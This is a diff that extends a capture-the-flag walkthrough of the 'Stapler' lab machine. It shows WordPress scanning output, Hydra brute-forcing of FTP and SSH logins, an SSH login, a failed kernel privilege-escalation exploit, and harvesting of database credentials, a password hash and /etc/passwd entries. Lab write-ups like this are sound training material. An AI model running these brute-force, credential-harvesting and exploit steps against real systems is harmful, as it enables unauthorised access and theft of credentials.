@@ -866,3 +866,738 @@ http just shows a generic image...https has much more interesting things.
 https://192.168.118.184:12380/blogblog/ is a wordpress site
 
 https://192.168.118.184:12380/phpmyadmin/ is a phpmyadmin site
+
+Lets see what wpscan can turn up
+
+root@kali:~/stapler# wpscan --disable-tls-checks --url https://192.168.118.184:12380/blogblog/ --enumerate u
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 2.9.2
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+[+] URL: https://192.168.118.184:12380/blogblog/
+[+] Started: Fri May 19 15:48:18 2017
+
+[!] The WordPress 'https://192.168.118.184:12380/blogblog/readme.html' file exists exposing a version number
+[+] Interesting header: DAVE: Soemthing doesn't look right here
+[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
+[!] Registration is enabled: https://192.168.118.184:12380/blogblog/wp-login.php?action=register
+[+] XML-RPC Interface available under: https://192.168.118.184:12380/blogblog/xmlrpc.php
+[!] Upload directory has directory listing enabled: https://192.168.118.184:12380/blogblog/wp-content/uploads/
+[!] Includes directory has directory listing enabled: https://192.168.118.184:12380/blogblog/wp-includes/
+
+[+] WordPress version 4.2.1 (Released on 2015-04-27) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
+[!] 41 vulnerabilities identified from the version number
+
+[!] Title: WordPress 4.1-4.2.1 - Genericons Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/7979
+    Reference: https://codex.wordpress.org/Version_4.2.2
+[i] Fixed in: 4.2.2
+
+[!] Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/8111
+    Reference: https://wordpress.org/news/2015/07/wordpress-4-2-3/
+    Reference: https://twitter.com/klikkioy/status/624264122570526720
+    Reference: https://klikki.fi/adv/wordpress3.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
+[i] Fixed in: 4.2.3
+
+[!] Title: WordPress <= 4.2.3 - wp_untrash_post_comments SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/8126
+    Reference: https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213
+[i] Fixed in: 4.2.4
+
+[!] Title: WordPress <= 4.2.3 - Timing Side Channel Attack
+    Reference: https://wpvulndb.com/vulnerabilities/8130
+    Reference: https://core.trac.wordpress.org/changeset/33536
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730
+[i] Fixed in: 4.2.4
+
+[!] Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/8131
+    Reference: https://core.trac.wordpress.org/changeset/33529
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732
+[i] Fixed in: 4.2.4
+
+[!] Title: WordPress <= 4.2.3 - Nav Menu Title Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/8132
+    Reference: https://core.trac.wordpress.org/changeset/33541
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5733
+[i] Fixed in: 4.2.4
+
+[!] Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/8133
+    Reference: https://core.trac.wordpress.org/changeset/33549
+    Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
+[i] Fixed in: 4.2.4
+
+[!] Title: WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/8186
+    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
+    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
+    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
+[i] Fixed in: 4.2.5
+
+[!] Title: WordPress <= 4.3 - User List Table Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/8187
+    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
+    Reference: https://github.com/WordPress/WordPress/commit/f91a5fd10ea7245e5b41e288624819a37adf290a
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7989
+[i] Fixed in: 4.2.5
+
+[!] Title: WordPress <= 4.3 - Publish Post & Mark as Sticky Permission Issue
+    Reference: https://wpvulndb.com/vulnerabilities/8188
+    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
+    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
+    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5715
+[i] Fixed in: 4.2.5
+
+[!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/8358
+    Reference: https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
+[i] Fixed in: 4.2.6
+
+[!] Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
+    Reference: https://wpvulndb.com/vulnerabilities/8376
+    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/36435
+    Reference: https://hackerone.com/reports/110801
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
+[i] Fixed in: 4.2.7
+
+[!] Title: WordPress 3.7-4.4.1 - Open Redirect
+    Reference: https://wpvulndb.com/vulnerabilities/8377
+    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/36444
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
+[i] Fixed in: 4.2.7
+
+[!] Title: WordPress <= 4.4.2 - SSRF Bypass using Octal & Hexedecimal IP addresses
+    Reference: https://wpvulndb.com/vulnerabilities/8473
+    Reference: https://codex.wordpress.org/Version_4.5
+    Reference: https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4029
+[i] Fixed in: 4.5
+
+[!] Title: WordPress <= 4.4.2 - Reflected XSS in Network Settings
+    Reference: https://wpvulndb.com/vulnerabilities/8474
+    Reference: https://codex.wordpress.org/Version_4.5
+    Reference: https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6634
+[i] Fixed in: 4.5
+
+[!] Title: WordPress <= 4.4.2 - Script Compression Option CSRF
+    Reference: https://wpvulndb.com/vulnerabilities/8475
+    Reference: https://codex.wordpress.org/Version_4.5
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6635
+[i] Fixed in: 4.5
+
+[!] Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/8488
+    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
+    Reference: https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36
+    Reference: https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567
+[i] Fixed in: 4.5.2
+
+[!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)
+    Reference: https://wpvulndb.com/vulnerabilities/8489
+    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
+    Reference: https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
+    Reference: https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
+    Reference: http://avlidienbrunn.com/wp_some_loader.php
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
+[i] Fixed in: 4.2.8
+
+[!] Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS
+    Reference: https://wpvulndb.com/vulnerabilities/8518
+    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
+    Reference: https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5833
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5834
+[i] Fixed in: 4.2.9
+
+[!] Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure
+    Reference: https://wpvulndb.com/vulnerabilities/8519
+    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
+    Reference: https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1
+    Reference: https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5835
+[i] Fixed in: 4.2.9
+
+[!] Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post
+    Reference: https://wpvulndb.com/vulnerabilities/8520
+    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
+    Reference: https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5837
+[i] Fixed in: 4.2.9
+
+[!] Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
+    Reference: https://wpvulndb.com/vulnerabilities/8615
+    Reference: https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
+    Reference: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html
+    Reference: http://seclists.org/fulldisclosure/2016/Sep/6
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168
+[i] Fixed in: 4.2.10
+
+[!] Title: WordPress 2.8-4.6 - Path Traversal in Upgrade Package Uploader
+    Reference: https://wpvulndb.com/vulnerabilities/8616
+    Reference: https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/54720a14d85bc1197ded7cb09bd3ea790caa0b6e
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7169
+[i] Fixed in: 4.2.10
+
+[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
+    Reference: https://wpvulndb.com/vulnerabilities/8716
+    Reference: https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
+[i] Fixed in: 4.2.11
+
+[!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
+    Reference: https://wpvulndb.com/vulnerabilities/8718
+    Reference: https://www.mehmetince.net/low-severity-wordpress/
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
+[i] Fixed in: 4.2.11
+
+[!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
+    Reference: https://wpvulndb.com/vulnerabilities/8719
+    Reference: https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
+[i] Fixed in: 4.2.11
+
+[!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
+    Reference: https://wpvulndb.com/vulnerabilities/8720
+    Reference: https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
+[i] Fixed in: 4.2.11
+
+[!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
+    Reference: https://wpvulndb.com/vulnerabilities/8721
+    Reference: https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
+[i] Fixed in: 4.2.11
+
+[!] Title: WordPress 4.2.0-4.7.1 - Press This UI Available to Unauthorised Users
+    Reference: https://wpvulndb.com/vulnerabilities/8729
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
+    Reference: https://github.com/WordPress/WordPress/commit/21264a31e0849e6ff793a06a17de877dd88ea454
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5610
+[i] Fixed in: 4.2.12
+
+[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/8730
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
+    Reference: https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
+[i] Fixed in: 4.2.12
+
+[!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
+    Reference: https://wpvulndb.com/vulnerabilities/8765
+    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
+    Reference: https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
+    Reference: http://seclists.org/oss-sec/2017/q1/563
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
+[i] Fixed in: 4.2.13
+
+[!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
+    Reference: https://wpvulndb.com/vulnerabilities/8766
+    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
+[i] Fixed in: 4.2.13
+
+[!] Title: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
+    Reference: https://wpvulndb.com/vulnerabilities/8768
+    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
+    Reference: https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
+[i] Fixed in: 4.2.13
+
+[!] Title: WordPress 4.2-4.7.2 - Press This CSRF DoS
+    Reference: https://wpvulndb.com/vulnerabilities/8770
+    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829
+    Reference: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
+    Reference: http://seclists.org/oss-sec/2017/q1/562
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6819
+[i] Fixed in: 4.2.13
+
+[!] Title: WordPress 2.3-4.7.5 - Host Header Injection in Password Reset
+    Reference: https://wpvulndb.com/vulnerabilities/8807
+    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
+    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
+
+[!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
+    Reference: https://wpvulndb.com/vulnerabilities/8815
+    Reference: https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+[i] Fixed in: 4.2.15
+
+[!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
+    Reference: https://wpvulndb.com/vulnerabilities/8816
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
+[i] Fixed in: 4.2.15
+
+[!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks
+    Reference: https://wpvulndb.com/vulnerabilities/8817
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
+[i] Fixed in: 4.2.15
+
+[!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
+    Reference: https://wpvulndb.com/vulnerabilities/8818
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
+[i] Fixed in: 4.2.15
+
+[!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
+    Reference: https://wpvulndb.com/vulnerabilities/8819
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
+[i] Fixed in: 4.2.15
+
+[!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
+    Reference: https://wpvulndb.com/vulnerabilities/8820
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
+[i] Fixed in: 4.2.15
+
+[+] WordPress theme in use: bhost - v1.2.9
+
+[+] Name: bhost - v1.2.9
+ |  Location: https://192.168.118.184:12380/blogblog/wp-content/themes/bhost/
+ |  Readme: https://192.168.118.184:12380/blogblog/wp-content/themes/bhost/readme.txt
+[!] The version is out of date, the latest version is 1.3.6
+ |  Style URL: https://192.168.118.184:12380/blogblog/wp-content/themes/bhost/style.css
+ |  Theme Name: BHost
+ |  Theme URI: Author: Masum Billah
+ |  Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This the...
+ |  Author: Masum Billah
+ |  Author URI: http://getmasum.net/
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found
+
+[+] Enumerating usernames ...
+[+] Identified the following 10 user/s:
+    +----+---------+-----------------+
+    | Id | Login   | Name            |
+    +----+---------+-----------------+
+    | 1  | john    | John Smith      |
+    | 2  | elly    | Elly Jones      |
+    | 3  | peter   | Peter Parker    |
+    | 4  | barry   | Barry Atkins    |
+    | 5  | heather | Heather Neville |
+    | 6  | garry   | garry           |
+    | 7  | harry   | harry           |
+    | 8  | scott   | scott           |
+    | 9  | kathy   | kathy           |
+    | 10 | tim     | tim             |
+    +----+---------+-----------------+
+
+[+] Finished: Fri May 19 15:48:19 2017
+[+] Requests Done: 56
+[+] Memory used: 31.594 MB
+[+] Elapsed time: 00:00:00
+
+A couple of problems with injection, but nothing quickly comes up.  I need to run to the store...sounds like a great time to start hydra beating on the ftp server!
+
+root@kali:~/stapler#cat users.txt
+peter
+RNunemaker
+ETollefson
+DSwanger
+AParnell
+SHayslett
+MBassin
+JBare
+LSolum
+IChadwick
+MFrei
+SStroud
+CCeaser
+JKanode
+CJoo
+Eeth
+LSolum2
+JLipps
+jamie
+Sam
+Drew
+jess
+SHAY
+Taylor
+mel
+kai
+zoe
+NATHAN
+www
+elly
+john
+barry
+heather
+garry
+harry
+scott
+kathy
+tim
+
+root@kali:~/stapler# hydra -L users.txt -e nsr -v ftp://192.168.118.184
+Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-05-19 16:43:09
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 114 login tries (l:38/p:3), ~0 tries per task
+[DATA] attacking service ftp on port 21
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[21][ftp] host: 192.168.118.184   login: SHayslett   password: SHayslett
+[21][ftp] host: 192.168.118.184   login: elly   password: ylle
+[STATUS] attack finished for 192.168.118.184 (waiting for children to complete tests)
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-05-19 16:43:33
+
+root@kali:~# ssh SHayslett@192.168.118.184
+-----------------------------------------------------------------
+~          Barry, don't forget to put a message here           ~
+-----------------------------------------------------------------
+SHayslett@192.168.118.184's password:
+Welcome back!
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/****/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+SHayslett@red:~$ sudo su
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for SHayslett:
+SHayslett is not in the sudoers file.  This incident will be reported.
+SHayslett@red:~$
+
+Worth a try :)
+
+SHayslett@red:~$ cat /proc/version
+Linux version 4.4.0-21-generic (buildd@lgw01-06) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016
+
+root@kali:~/stapler# searchsploit 4.4.0-21
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Pri | lin_x86-64/local/40049.c
+
+SHayslett@red:~$ cp 40049.c pwn.c
+SHayslett@red:~$ vi pwn.c
+SHayslett@red:~$ mv 40049.c decr.c
+SHayslett@red:~$ vi decr.c
+SHayslett@red:~$ gcc decr.c -m32 -O2 -o decr
+SHayslett@red:~$ gcc pwn.c -O2 -o pwn
+pwn.c: In function ‘privesc’:
+pwn.c:26:42: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+         commit_creds(prepare_kernel_cred((uint64_t)NULL));
+                                          ^
+SHayslett@red:~$ ls
+decr  decr.c  pwn  pwn.c
+SHayslett@red:~$ ./decr
+netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik
+[-] SMEP/SMAP support dectected! Quitting...
+
+Close, but no.  Time to keep digging.
+
+Hayslett@red:~$ dpkg --get-selections | grep deinstall
+libmcrypt4					deinstall
+linux-image-4.4.0-22-generic			deinstall
+linux-image-extra-4.4.0-22-generic		deinstall
+resolvconf					deinstall
+SHayslett@red:~$
+
+Nothing overly cool there.  Time to poke around the webapps, see if there are any stored credentals.
+
+SHayslett@red:/var/www$ ls -l
+total 4
+drwxr-xr-x 5 root root 4096 Jun  5  2016 https
+
+I can write to www, would be an easy place to drop a reverse shell if I needed to keep access and was worried about my account.
+
+SHayslett@red:/var/www/https/blogblog$ more wp-config.php
+
+****snip****
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'plbkac');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+**
+
+SHayslett@red:/var/www/https/blogblog$ mysql -u root -p
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 93
+Server version: 5.7.12-0ubuntu1 (Ubuntu)
+
+Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql>
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| loot               |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| proof              |
+| sys                |
+| wordpress          |
++--------------------+
+8 rows in set (0.00 sec)
+
+mysql> use loot;
+Database changed
+mysql> show tables;
++----------------------------+
+| Tables_in_loot             |
++----------------------------+
+| actor                      |
+| actor_info                 |
+| address                    |
+| category                   |
+| city                       |
+| country                    |
+| customer                   |
+| customer_list              |
+| film                       |
+| film_actor                 |
+| film_category              |
+| film_list                  |
+| film_text                  |
+| inventory                  |
+| language                   |
+| nicer_but_slower_film_list |
+| payment                    |
+| rental                     |
+| sales_by_film_category     |
+| sales_by_store             |
+| staff                      |
+| staff_list                 |
+| store                      |
++----------------------------+
+23 rows in set (0.00 sec)
+
+mysql> select username,password from staff;
++----------+------------------------------------------+
+| username | password                                 |
++----------+------------------------------------------+
+| Mike     | 8cb2237d0679ca88db6464eac60da96345513964 |
+| Jon      | NULL                                     |
++----------+------------------------------------------+
+2 rows in set (0.00 sec)
+
+mysql>
+
+Neat stuff, but nothing that will help with rooting the box.
+
+Might as well grab the passwd file and start hydra again with a clean list.
+
+SHayslett@red:/var/www/https$ cat /etc/passwd | grep bash
+RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
+ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
+DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
+AParnell:x:1004:1004::/home/AParnell:/bin/bash
+SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
+MBassin:x:1006:1006::/home/MBassin:/bin/bash
+JBare:x:1007:1007::/home/JBare:/bin/bash
+LSolum:x:1008:1008::/home/LSolum:/bin/bash
+MFrei:x:1010:1010::/home/MFrei:/bin/bash
+SStroud:x:1011:1011::/home/SStroud:/bin/bash
+JKanode:x:1013:1013::/home/JKanode:/bin/bash
+CJoo:x:1014:1014::/home/CJoo:/bin/bash
+Drew:x:1020:1020::/home/Drew:/bin/bash
+jess:x:1021:1021::/home/jess:/bin/bash
+SHAY:x:1022:1022::/home/SHAY:/bin/bash
+mel:x:1024:1024::/home/mel:/bin/bash
+zoe:x:1026:1026::/home/zoe:/bin/bash
+NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
+elly:x:1029:1029::/home/elly:/bin/bash
+SHayslett@red:/var/www/https$
+
+root@kali:~/stapler# hydra -L ssh_users.txt -v -t 4 -e nsr ssh://192.168.118.184
+
+I'll just let that run in the background while i poke at the server more.
+
+There was that strange service listening on port 666.  Wonder what we can find from that.
+
+SHayslett@red:/var/www/https$ netstat -lnp
+
+Doesn't give me anything useful, need to be root.  Maybe I can find something in the processes that looks guilty.
+
+SHayslett@red:/var/www/https$ ps aux
+
+****snip****
+
+JKanode   1579  0.0  0.4   6372  4284 ?        Ss   May19   0:00 /lib/systemd/systemd --user
+www       1585  0.0  0.1   7896  1556 ?        S    May19   0:00 (sd-pam)
+JKanode   1586  0.0  0.1   7896  1616 ?        S    May19   0:00 (sd-pam)
+JKanode   1592  0.0  0.2   5436  2864 ?        Ss   May19   0:00 bash -c cd /home/JKanode; python2 -m Sim
+www       1593  0.0  0.0   5432   676 ?        Ss   May19   0:00 bash -c authbind php -S 0.0.0.0:80 -t /h
+www       1594  0.0  2.4 126008 24616 ?        S    May19   0:01 php -S 0.0.0.0:80 -t /home/www/
+JKanode   1595  0.0  0.9  14696  9864 ?        S    May19   0:02 python2 -m SimpleHTTPServer 8888
+
+****snip****
+
+Hey!  I've lost interest in the strange service on 666.  Hello JKanode, what are you doing?
+
+SHayslett@red:/home$ ls -la | grep JKanode
+drwxr-xr-x  2 JKanode    JKanode    4096 Jun  5  2016 JKanode
+
